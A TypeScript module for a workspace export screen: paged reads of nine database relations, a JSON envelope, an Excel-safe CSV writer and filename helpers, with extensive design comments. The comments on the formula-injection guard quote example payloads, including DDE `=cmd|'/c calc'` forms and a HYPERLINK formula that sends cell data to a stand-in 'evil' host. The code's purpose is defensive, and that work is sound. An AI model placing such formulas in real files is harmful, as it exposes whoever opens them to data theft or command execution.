// Workspace export — the serialisation half. Pure, and tested as such.
//
// WHAT THIS MODULE IS. Everything the export screen does that is not I/O and not
// a DOM call: the list of relations to read, the paging driver, the JSON
// envelope, and a CSV writer that survives Excel. `pages/settings/Export.tsx`
// supplies a page reader closed over the Supabase client, hands the result to
// the two serialisers and turns the string into a Blob. That split is not
// filing — it is what makes the interesting parts testable in `vitest`'s `node`
// environment, which has no `document` and no network.
//
// LAYERING. `src/lib/**` may not import from `src/store/**` or `src/api/**`
// (EXECUTION-PLAN §1.1, standing grep). So this file declares its own
// `ExportResult<T>`, structurally identical to `api/result.ts`'s `ApiResult<T>`
// — an `ApiResult` assigns straight to it with no cast and no adapter, which is
// exactly how Export.tsx passes one in. Duplicating three lines of type is the
// price of not putting an `api/` edge in the import graph of every pure test in
// the repo; the alternative was moving the whole module into `api/`, which
// would have made the CSV escaping untestable without a Supabase client.
//
// ── THE TWO FORMATS DO DIFFERENT JOBS ──────────────────────────────────────
//
// JSON is the LOSSLESS one. Every relation the caller can read, every column,
// nested arrays and jsonb intact, Arabic as literal UTF-8 rather than \u
// escapes. It is the format that round-trips: what comes out can be read back
// and compared byte for byte against what went in. If you are keeping one file,
// keep this one.
//
// CSV is the SPREADSHEET one, and it is lossy on purpose. It flattens ONE
// relation — entries — because a CSV has exactly one header row and nine
// relations with different shapes do not have one. Tags and links collapse to
// delimited text. And a cell that begins with `=`, `+`, `-` or `@` is prefixed
// with an apostrophe, which changes the bytes: that is the formula-injection
// guard, and it is not optional. See csvGuard() for what it prevents.
//
// ── PAGING IS A CORRECTNESS REQUIREMENT, NOT FUTURE-PROOFING ───────────────
//
// PostgREST clamps every response at `db-max-rows` — live-verified at 1000 on
// this project — and it applies the clamp AFTER any `.limit()`, silently. The
// answer is a 200 with fewer rows than exist, which is indistinguishable from a
// small table. An export is the one screen where that failure is unrecoverable:
// the user takes the file away and finds out months later that the archive
// stops at a thousand entries. So every relation is read with `.range()` pages
// until a SHORT page arrives, under a total order, and a read that hits
// EXPORT_MAX_PAGES is reported as `truncated` rather than returned as if it
// were complete. api/timeline.ts and api/entries.ts made the same call for the
// same reason; the number lives in all three and must move in all three.

import type { Entry, EntryLink } from '../types'

/* ─────────────────────────── result convention ─────────────────────────── */

/**
 * The discriminated result this module speaks.
 *
 * Structurally identical to `ApiResult<T>` in `src/api/result.ts` — see the
 * header for why it is redeclared rather than imported. `error` is an i18n KEY,
 * not a sentence, matching the convention every api function follows.
 */
export type ExportResult<T> = { ok: true; data: T } | { ok: false; error: string }

/* ────────────────────────────── what we read ───────────────────────────── */

/**
 * The relations an export covers.
 *
 * `profiles` is deliberately absent. It is readable by any member, and a
 * one-click file of every teammate's name and role is a different feature with
 * a different conversation attached — the two columns an entry actually needs
 * (owner, author) are already denormalised into the CSV by the page's name
 * resolver. Add it when somebody asks, not by default.
 *
 * `config_audit` is absent for the mirror reason: it is admin-visible history
 * of who changed what, it is unbounded, and nothing in the spec asks for it.
 *
 * `v_entry_health` is absent because it is DERIVED — every column in it is
 * recomputable from `entries` plus `vocab_options`, both of which are here, and
 * exporting a view alongside its inputs means shipping two answers that can
 * disagree the moment an admin edits a staleness rule.
 */
export type ExportTableKey =
  | 'entries'
  | 'entry_updates'
  | 'tracks'
  | 'vocab_options'
  | 'meetings'
  | 'meeting_lines'
  | 'recurring_templates'
  | 'notifications'
  | 'track_slas'

/** One `.order()` clause. */
export interface ExportOrder {
  column: string
  ascending: boolean
}

/** How to read one relation, completely and reproducibly. */
export interface ExportTableSpec {
  /** The key this relation takes in the JSON envelope. */
  key: ExportTableKey
  /** The PostgREST relation name. Separate from `key` so a view can be swapped in. */
  table: string
  /**
   * A TOTAL order — the last column (or the last pair) is unique within the
   * ones before it.
   *
   * This is not a presentation choice, it is what makes paging safe. Rows
   * written by one statement share a timestamp to the microsecond; under a
   * non-total order the server is free to return them in a different sequence
   * on every request, and the boundary between page 1 and page 2 then lands in
   * a different place each time — silently dropping some rows and duplicating
   * others in a file nobody will re-check.
   */
  order: readonly ExportOrder[]
}

/**
 * Every relation, in the order the file lists them.
 *
 * Parents before children (tracks before entries before entry_updates, meetings
 * before meeting_lines) so a human reading the JSON top to bottom meets a
 * `track_id` after the track it names. It costs nothing and makes the artifact
 * legible.
 *
 * The order clauses are per-relation because the keys are: `vocab_options` is
 * keyed `(kind, key)` and `track_slas` `(track_id, priority)` — neither has an
 * `id` column at all, so "order by id" is not available as a house rule.
 */
export const EXPORT_TABLES: readonly ExportTableSpec[] = [
  {
    key: 'tracks',
    table: 'tracks',
    order: [
      { column: 'sort_order', ascending: true },
      { column: 'id', ascending: true },
    ],
  },
  {
    key: 'vocab_options',
    table: 'vocab_options',
    order: [
      { column: 'kind', ascending: true },
      { column: 'sort_order', ascending: true },
      { column: 'key', ascending: true },
    ],
  },
  {
    key: 'track_slas',
    table: 'track_slas',
    order: [
      { column: 'track_id', ascending: true },
      { column: 'priority', ascending: true },
    ],
  },
  {
    key: 'entries',
    table: 'entries',
    // Newest first, so a read that hits the cap loses its OLDEST rows — a tail
    // the user can see is missing, rather than a hole in the middle.
    order: [
      { column: 'created_at', ascending: false },
      { column: 'id', ascending: false },
    ],
  },
  {
    key: 'entry_updates',
    table: 'entry_updates',
    order: [
      { column: 'created_at', ascending: false },
      { column: 'id', ascending: false },
    ],
  },
  {
    key: 'meetings',
    table: 'meetings',
    order: [
      { column: 'started_at', ascending: false },
      { column: 'id', ascending: false },
    ],
  },
  {
    key: 'meeting_lines',
    table: 'meeting_lines',
    // (meeting_id, seq) is the table's own unique index — the order the minutes
    // are written in, which is the only order these rows mean anything in.
    order: [
      { column: 'meeting_id', ascending: true },
      { column: 'seq', ascending: true },
    ],
  },
  {
    key: 'recurring_templates',
    table: 'recurring_templates',
    order: [
      { column: 'next_run_on', ascending: true },
      { column: 'id', ascending: true },
    ],
  },
  {
    key: 'notifications',
    table: 'notifications',
    // RLS scopes this to `recipient_id = auth.uid()`, so this relation is the
    // signed-in person's own inbox and nobody else's — by the database, not by
    // a filter here.
    order: [
      { column: 'created_at', ascending: false },
      { column: 'id', ascending: false },
    ],
  },
]

/**
 * Rows per request.
 *
 * THE SERVER'S NUMBER, NOT A PREFERENCE. The live project reports
 * `db-max-rows: 1000`; raising it here changes nothing until that is raised
 * too, and lowering it only makes the loop chattier. Matches `MAX_ROWS` in
 * api/entries.ts and `PAGE_SIZE` in api/timeline.ts and must move with them.
 */
export const EXPORT_PAGE_SIZE = 1000

/**
 * The page ceiling per relation — 50 pages, so 50 000 rows each.
 *
 * Higher than the timeline's 5 because the timeline has a date range control
 * and this has none: "export everything" is the whole feature, and stopping at
 * 5000 entries would be the truncation this module exists to prevent. It is
 * still bounded, because a runaway table must not page forever on a phone; past
 * it the relation is marked `truncated` and the screen says so in words.
 */
export const EXPORT_MAX_PAGES = 50

/* ─────────────────────────── the paging driver ─────────────────────────── */

/**
 * One page of one relation, as the caller's I/O layer resolves it.
 *
 * The spec is passed whole rather than as a table name so the reader can apply
 * `order` without duplicating the table→order table.
 */
export type ExportPageReader = (
  spec: ExportTableSpec,
  offset: number,
  limit: number,
) => Promise<ExportResult<readonly unknown[]>>

/** What the screen renders while the read runs. */
export interface ExportProgress {
  /** Relations fully read so far. */
  completed: number
  /** Relations in this export. */
  total: number
  /** The relation being read right now; null once everything is done. */
  table: ExportTableKey | null
  /** Rows collected across every relation so far. */
  rows: number
}

/** Everything read, keyed by relation. */
export interface ExportBundle {
  /**
   * Relation → its rows, in spec order. Partial because a caller may export a
   * subset (the tests do); a key absent from `EXPORT_TABLES` is absent here.
   */
  tables: Readonly<Partial<Record<ExportTableKey, readonly unknown[]>>>
  /** Relations that stopped at EXPORT_MAX_PAGES, so their oldest rows are missing. */
  truncated: readonly ExportTableKey[]
  /** Total rows across every relation — the number the screen counts up. */
  rows: number
}

/**
 * Walk one relation's pages until the server runs out or the cap stops us.
 *
 * The stop condition is a SHORT page, not an empty one: a full page means there
 * may be more, a short page means there is not, and asking for the empty page
 * after an exact multiple costs one extra round trip that only happens when the
 * row count is a multiple of 1000.
 *
 * A page LONGER than asked for is treated as a full page rather than trusted to
 * be the end — a server that ignores `.range()` would otherwise look like a
 * complete short read.
 */
async function collectTable(
  spec: ExportTableSpec,
  read: ExportPageReader,
  onPage: (rows: number) => void,
): Promise<ExportResult<{ rows: unknown[]; truncated: boolean }>> {
  const rows: unknown[] = []
  for (let page = 0; page < EXPORT_MAX_PAGES; page += 1) {
    const result = await read(spec, page * EXPORT_PAGE_SIZE, EXPORT_PAGE_SIZE)
    if (!result.ok) return result
    const batch = result.data
    rows.push(...batch)
    onPage(batch.length)
    if (batch.length < EXPORT_PAGE_SIZE) return { ok: true, data: { rows, truncated: false } }
  }
  return { ok: true, data: { rows, truncated: true } }
}

/**
 * Read every relation, sequentially, reporting progress as it goes.
 *
 * SEQUENTIAL, NOT PARALLEL, and that is deliberate. Nine concurrent multi-page
 * reads on hotel wifi is how you get a request timeout on the one screen whose
 * failure mode is "start again from the beginning"; and a progress bar that
 * moves is worth more here than a wall-clock second, because the user is
 * waiting on this and nothing else.
 *
 * The FIRST failure aborts. A partial export that looks complete is worse than
 * no export — the whole point of the file is that it is the record.
 */
export async function collectExport(
  read: ExportPageReader,
  onProgress?: (progress: ExportProgress) => void,
  specs: readonly ExportTableSpec[] = EXPORT_TABLES,
): Promise<ExportResult<ExportBundle>> {
  const tables: Partial<Record<ExportTableKey, readonly unknown[]>> = {}
  const truncated: ExportTableKey[] = []
  let rows = 0

  const report = (completed: number, table: ExportTableKey | null): void => {
    onProgress?.({ completed, total: specs.length, table, rows })
  }

  for (let i = 0; i < specs.length; i += 1) {
    const spec = specs[i]
    report(i, spec.key)
    const result = await collectTable(spec, read, (n) => {
      rows += n
      // Per PAGE, not per relation: a workspace with 40 000 entries would
      // otherwise show a frozen counter for the length of the biggest read.
      report(i, spec.key)
    })
    if (!result.ok) return result
    tables[spec.key] = result.data.rows
    if (result.data.truncated) truncated.push(spec.key)
  }

  report(specs.length, null)
  return { ok: true, data: { tables, truncated, rows } }
}

/* ──────────────────────────── the JSON envelope ────────────────────────── */

/**
 * The document version.
 *
 * Bump it when the SHAPE of the envelope changes — a renamed key, a moved
 * field. Adding a relation to `data` is not a bump: a reader that keys off
 * `data.entries` is unaffected by `data.meetings` appearing beside it.
 */
const EXPORT_FORMAT_VERSION = 1

/** Fields the caller knows and this module cannot. */
export interface ExportMeta {
  /** ISO instant — `new Date().toISOString()` at the moment the read finished. */
  exportedAt: string
  /** The UI language the export was taken in. Not a filter; a provenance note. */
  locale: string
  /** App version, from `__APP_VERSION__`. Empty string when unknown. */
  appVersion: string
}

/** The JSON export, in full. */
export interface ExportEnvelope extends ExportMeta {
  /**
   * A magic string, so a reader can tell this file from any other JSON.
   *
   * FROZEN AT THE RETIRED SLUG, ON PURPOSE. Every export anyone has already
   * taken carries `opstrack-export`, and a reader identifies the file by
   * matching this exact value — so renaming it to follow the brand makes every
   * file the app has ever written unreadable by the app that wrote it. It moves
   * only behind a format migration that accepts both, never with a rename.
   *
   * The filename two hundred lines down does NOT share this constraint and has
   * already moved twice (`opstrack-` → `coretrack-` → `nphiescore-`): nothing
   * keys off a filename, and it is read by people rather than by parsers. The
   * two strings look like the same string half-renamed. They are not, and
   * brand.test.ts asserts both spellings so a sweep that "finishes the job"
   * fails a gate instead of shipping.
   */
  format: 'opstrack-export'
  version: number
  /** Relations whose read hit the page cap — their OLDEST rows are missing. */
  truncated: readonly ExportTableKey[]
  /** Relation → row count. Redundant with `data`, and worth it: it is the first
      thing anyone checks, and checking it should not mean parsing 8 MB. */
  counts: Readonly<Partial<Record<ExportTableKey, number>>>
  data: Readonly<Partial<Record<ExportTableKey, readonly unknown[]>>>
}

/** Wrap a collected bundle in the envelope. Pure; does no I/O and reads no clock. */
export function buildEnvelope(bundle: ExportBundle, meta: ExportMeta): ExportEnvelope {
  const counts: Partial<Record<ExportTableKey, number>> = {}
  for (const [key, value] of Object.entries(bundle.tables)) {
    counts[key as ExportTableKey] = value.length
  }
  return {
    format: 'opstrack-export',
    version: EXPORT_FORMAT_VERSION,
    exportedAt: meta.exportedAt,
    locale: meta.locale,
    appVersion: meta.appVersion,
    truncated: bundle.truncated,
    counts,
    data: bundle.tables,
  }
}

/**
 * The envelope as a file.
 *
 * Indented, because the file is read by people at least as often as by
 * machines, and gzip over the wire makes the size difference academic once it
 * is on disk. `JSON.stringify` emits Arabic as literal UTF-8 rather than \u
 * escapes, which is the whole of the "Arabic survives the round trip"
 * requirement — no encoding step is needed or wanted.
 */
export function serializeExport(envelope: ExportEnvelope): string {
  return JSON.stringify(envelope, null, 2)
}

/* ──────────────────────────────── the CSV ──────────────────────────────── */

/**
 * U+FEFF, first byte of the file.
 *
 * Without it Excel on Windows reads a UTF-8 CSV as the system codepage and
 * every Arabic string in the file becomes mojibake — not a display quirk, a
 * corrupted import. LibreOffice and Numbers detect UTF-8 without it; Excel does
 * not, and Excel is what the file is for.
 */
export const CSV_BOM = '\uFEFF'

/**
 * CRLF, for the same reason.
 *
 * RFC 4180 says CRLF and Excel's importer agrees; a bare LF inside an unquoted
 * field is tolerated by most readers but a bare-LF FILE has been known to land
 * as a single row in older Excel builds on Windows.
 */
export const CSV_EOL = '\r\n'

/**
 * The characters that make Excel treat a cell as a formula rather than text.
 *
 * `= + - @` are the documented four. TAB and CR are here too because Excel
 * strips leading whitespace before deciding, so `\t=cmd|'/c calc'!A0` reaches
 * the same interpreter that `=cmd…` does — the bypass that made this a CVE
 * class rather than a curiosity.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/

/**
 * Neutralise a cell that Excel would otherwise execute.
 *
 * THE ATTACK. A CSV cell is not data to a spreadsheet: `=HYPERLINK("https://
 * evil/?x="&A1,"Click")` exfiltrates the row next to it, and the DDE forms
 * (`=cmd|'/c …'!A0`) reach the shell on an unpatched Excel. Every string in
 * this export is user-supplied — an entry title, a tag, a free-text owner name,
 * a meeting note — so every string is a candidate. A workspace member who types
 * a formula into a title has, without this, a script that runs on whoever opens
 * the export.
 *
 * THE FIX, and its cost. Prefix with an apostrophe, which is Excel's own
 * "treat this as text" marker: the cell displays as the user typed it and is
 * never evaluated. It DOES change the bytes — a strict round-trip through CSV
 * gets `'=x` back where `=x` went in — and that is why the JSON export exists
 * and why this function is documented rather than hidden. The lossless channel
 * is JSON; the safe channel is CSV; they are not the same file.
 *
 * NUMBERS ARE NOT GUARDED, and must not be — see csvCell(). `-5` arriving as a
 * `number` is a quantity and stays one; `-5` arriving as a `string` is text
 * from a text column and is guarded, because this function cannot tell it from
 * `-1+1`.
 */
export function csvGuard(text: string): string {
  return FORMULA_LEAD.test(text) ? `'${text}` : text
}

/** Quote and escape per RFC 4180 — doubled quotes, and quotes around anything
    holding a delimiter, a quote or a line break. */
function csvQuote(text: string): string {
  if (!/[",\r\n]/.test(text)) return text
  return `"${text.replace(/"/g, '""')}"`
}

/**
 * A non-string, non-number, non-boolean cell as text.
 *
 * `JSON.stringify` is TYPED `string` and genuinely returns `undefined` for a
 * function or a symbol. Neither can arrive from PostgREST, and the annotation
 * is what lets the `??` below be an honest guard rather than dead code the
 * compiler cannot see through.
 */
function stringifyCell(value: unknown): string {
  const json: string | undefined = JSON.stringify(value)
  return json ?? ''
}

/**
 * One cell, from anything.
 *
 * Total over `unknown` on purpose: the rows come from PostgREST and a column
 * that gains a type is a data change, not a crash.
 *
 *   null / undefined → empty, which is how a spreadsheet spells "no value".
 *   number           → verbatim and UNGUARDED, so `-5` stays a number. A
 *                      non-finite number is empty rather than the string "NaN",
 *                      which would sort as text in a numeric column.
 *   boolean          → `true` / `false`, which Excel recognises.
 *   string           → guarded, then escaped.
 *   anything else    → JSON, then guarded and escaped. Reaching this branch
 *                      means a caller passed a raw jsonb column; the flattener
 *                      below does not, and the fallback is here so an added
 *                      column degrades to legible text instead of `[object
 *                      Object]`.
 */
export function csvCell(value: unknown): string {
  if (value === null || value === undefined) return ''
  if (typeof value === 'number') return Number.isFinite(value) ? String(value) : ''
  if (typeof value === 'boolean') return value ? 'true' : 'false'
  const text = typeof value === 'string' ? value : stringifyCell(value)
  return csvQuote(csvGuard(text))
}

/** One record, no line terminator. */
export function csvRow(values: readonly unknown[]): string {
  return values.map(csvCell).join(',')
}

/**
 * A whole CSV file: BOM, header, records, every record CRLF-terminated
 * INCLUDING the last.
 *
 * Terminating the last record is RFC 4180's optional half and Excel's
 * preference; a file whose final line has no terminator is appended to
 * incorrectly by half the tools that ever append to a CSV.
 *
 * The header goes through the same cell writer as the data. Column names are
 * ours and none of them starts with `=`, but running them through a different
 * path is how the two drift.
 */
export function toCsv(
  header: readonly string[],
  rows: readonly (readonly unknown[])[],
): string {
  const lines = [csvRow(header), ...rows.map(csvRow)]
  return CSV_BOM + lines.map((line) => line + CSV_EOL).join('')
}

/* ────────────────────────── entries, flattened ─────────────────────────── */

/**
 * The CSV's columns, in order.
 *
 * Hand-declared rather than derived from `Object.keys(entry)`, for two reasons.
 * A key walk has no guaranteed order, so the column layout would change with
 * the shape of whatever row happened to come first. And the file carries three
 * columns no `entries` row has — `track`, `owner`, `links` — because a
 * spreadsheet of uuids is not something anyone can read.
 *
 * BOTH the id and the resolved name ship for track and owner. The name is for
 * the human; the id is what makes the file joinable back to the JSON export and
 * survives a rename.
 *
 * `updated_by` (added by migration 0007) is present in the JSON export, which
 * takes `select('*')`, and absent here — `src/types.ts`'s `Entry` does not
 * declare it, that file is integrator-owned and append-only, and inventing the
 * field locally would be a second definition to drift. Recorded in the handoff.
 */
export const ENTRY_CSV_COLUMNS = [
  'id',
  'title',
  'description',
  'type',
  'status',
  'priority',
  'track',
  'track_id',
  'owner',
  'owner_id',
  'owner_name',
  'requester',
  'due_date',
  'follow_up_date',
  'tags',
  'links',
  'created_at',
  'updated_at',
  'closed_at',
  'last_activity_at',
  'created_by',
  'meeting_id',
  'template_id',
] as const

/**
 * The separator inside a multi-value cell.
 *
 * A semicolon rather than a comma, and not because a comma would break the
 * file — csvQuote handles that. Because the person who opens this in Excel and
 * runs Data ▸ Text to Columns on the tags cell reaches for the comma first, and
 * a comma-joined list inside a comma-delimited file makes that split ambiguous
 * for any tag that contains one.
 */
export const CSV_MULTI_SEP = '; '

/**
 * How the page resolves the two denormalised name columns.
 *
 * Injected rather than imported: the names live in `store/config` and
 * `store/members`, which `src/lib/**` may not reach. Both return a plain string
 * and neither may throw — an unknown id is a missing row, which is '' here.
 */
export interface EntryCsvContext {
  /** Track id → the track's name in the current locale, '' when unknown. */
  trackName: (trackId: string | null) => string
  /** A member id or free-text owner → a display name, '' when there is neither. */
  personName: (ownerId: string | null, ownerName: string | null) => string
}

/** `label (url)`, or just the url when the link was saved without a label. */
function linkText(link: EntryLink): string {
  const label = link.label.trim()
  return label ? `${label} (${link.url})` : link.url
}

/**
 * One entry as a row of `ENTRY_CSV_COLUMNS`.
 *
 * Defensive about the two array columns: `tags` and `links` are `not null
 * default '{}'` / `'[]'` in the schema, but this row may also have come out of
 * the offline cache or an older export, and `?? []` costs nothing next to a
 * whole export failing on one malformed row.
 */
export function entryCsvRow(entry: Entry, ctx: EntryCsvContext): readonly unknown[] {
  return [
    entry.id,
    entry.title,
    entry.description,
    entry.type,
    entry.status,
    entry.priority,
    ctx.trackName(entry.track_id),
    entry.track_id,
    ctx.personName(entry.owner_id, entry.owner_name),
    entry.owner_id,
    entry.owner_name,
    entry.requester,
    entry.due_date,
    entry.follow_up_date,
    (entry.tags ?? []).join(CSV_MULTI_SEP),
    (entry.links ?? []).map(linkText).join(CSV_MULTI_SEP),
    entry.created_at,
    entry.updated_at,
    entry.closed_at,
    entry.last_activity_at,
    entry.created_by,
    entry.meeting_id,
    entry.template_id,
  ]
}

/** The entries CSV, complete and Excel-safe. */
export function entriesCsv(entries: readonly Entry[], ctx: EntryCsvContext): string {
  return toCsv(
    ENTRY_CSV_COLUMNS,
    entries.map((entry) => entryCsvRow(entry, ctx)),
  )
}

/**
 * The `entries` rows out of a bundle, typed.
 *
 * An assertion, not a validation: these rows came from `entries` under
 * `select('*')` two function calls ago, and re-parsing 40 000 of them to prove
 * it would cost more than the whole read. It is one cast in one place instead of
 * one at every call site.
 */
export function bundleEntries(bundle: ExportBundle): readonly Entry[] {
  return (bundle.tables.entries ?? []) as readonly Entry[]
}

/* ──────────────────────────────── filenames ────────────────────────────── */

/** Two digits, for the filename stamp. */
function pad(n: number): string {
  return n < 10 ? `0${n}` : String(n)
}

/**
 * `nphiescore-export-2026-07-30-1432.json`.
 *
 * LOCAL time, not UTC. The stamp exists so a person can tell two exports apart
 * in a Downloads folder, and "when did I take this" is a question they answer
 * in their own clock. Sortable-first ordering so the folder sorts
 * chronologically by name.
 *
 * No colons and no spaces: both are legal in a filename on macOS and neither
 * survives the trip to a Windows share.
 *
 * THE PREFIX IS THE BRAND — and note it is NOT the same string as the envelope's
 * `format: 'opstrack-export'` a few hundred lines up, which stays. That one is a
 * magic value a reader matches on to identify the file; renaming it would make
 * every export taken before this build unrecognisable to every export taken
 * after. This one is a word in someone's Downloads folder. The two happened to
 * share a spelling once; they never shared a reason, and they have now been
 * spelled differently across two renames (opstrack → coretrack → nphiescore)
 * while the tag never moved. brand.test.ts pins BOTH sides — the filename to the
 * current brand, the tag to `opstrack-export` — so the gap between them is a
 * gate, not a loose end for a later sweep to tidy up.
 */
export function exportFilename(kind: 'json' | 'csv', at: Date): string {
  const stamp = `${at.getFullYear()}-${pad(at.getMonth() + 1)}-${pad(at.getDate())}-${pad(
    at.getHours(),
  )}${pad(at.getMinutes())}`
  return `nphiescore-export-${stamp}.${kind}`
}

/**
 * The MIME type for a download of this kind.
 *
 * `text/csv;charset=utf-8` states the encoding explicitly. The BOM already says
 * it, and a Content-Type that disagrees with the BOM is how a file ends up
 * decoded twice.
 */
export function exportMimeType(kind: 'json' | 'csv'): string {
  return kind === 'json' ? 'application/json;charset=utf-8' : 'text/csv;charset=utf-8'
}
